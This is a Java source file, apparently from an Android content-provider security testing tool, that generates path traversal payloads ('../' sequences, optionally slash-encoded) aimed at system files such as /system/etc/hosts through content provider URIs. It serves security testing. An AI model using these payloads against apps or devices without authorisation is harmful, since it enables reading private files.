// Copyright (c) 2019-2020 Calum Ewart Hutton
// Distributed under the GNU General Public License v3.0+, see the accompanying
// file LICENSE or https://opensource.org/licenses/GPL-3.0.

package lib.chutchut.cpmap.payload;

import java.util.LinkedHashSet;
import java.util.Set;

import lib.chutchut.cpmap.payload.base.Payload;
import lib.chutchut.cpmap.payload.base.UriPathPayload;
import lib.chutchut.cpmap.vector.CPVector;


public class PathTraversalPayload extends UriPathPayload implements Payload.IPayload {

    public static final String NAME = "TRAVERSAL";
    public static final int TYPE = 336;

    protected int numTrav;

    public static class Payloads {
        private static String[] templates = new String[]{
                "[TRAVERSAL][PATH]",
        };

        public static Set<PathTraversalPayload> getDefault() {
            return get("/system/etc/hosts", 0, true);
        }

        public static Set<PathTraversalPayload> get(String path, int num, boolean encode) {
            LinkedHashSet<PathTraversalPayload> payloads = new LinkedHashSet<>();
            for (String tpl : templates) {
                for (int i = 0; i <= num; i++) {
                    Builder builder = new Builder(TYPE, NAME, tpl);
                    if (path != null) {
                        builder.setTargetPath(path);
                    }
                    builder.setNumTrav(i);
                    payloads.add(builder.build());
                    if (encode) {
                        builder.setEncodeSlashes(true);
                        payloads.add(builder.build());
                    }
                }
            }
            return payloads;
        }
    }

    public static class Builder extends UriPathPayload.Builder {
        protected int numTrav;

        public Builder(int type, String name, String template) {
            super(type, name, template);
        }

        public Builder(PathTraversalPayload traversalPayload, CPVector vector) {
            super(traversalPayload, vector);
            numTrav = traversalPayload.numTrav;
        }

        public void setNumTrav(int num) {
            numTrav = num;
        }

        public void addNumTrav() {
            numTrav++;
        }

        @Override
        public PathTraversalPayload build() {
            return new PathTraversalPayload(this);
        }
    }

    /*
     * Default constructor for Gson
     */
    protected PathTraversalPayload() {
        super();
    }

    protected PathTraversalPayload(int type, String name, String template) {
        super(type, name, template);
    }

    protected PathTraversalPayload(Builder builder) {
        super(builder);
        numTrav = builder.numTrav;
    }

    public int getNumTrav() {
        return numTrav;
    }

    @Override
    public void renderPlaceholder(String key) {
        // Call parent to render base keys
        super.renderPlaceholder(key);
        switch (key) {
            case "TRAVERSAL":
                setPlaceholder(key, renderTraversal());
                break;
        }
    }

    @Override
    public boolean isSupportedVector(CPVector vector) {
        // Expect non-null URI_ID vector
        return vector != null && vector.getType() == CPVector.URI_ID;
    }

    private String renderTraversal() {
        StringBuilder sb = new StringBuilder("/");
        for (int i = 0; i < numTrav; i++) {
            sb.append("../");
        }
        // Trim the last slash
        return numTrav > 0 ? sb.toString().substring(0, sb.toString().length() - 1) : "";
    }
}
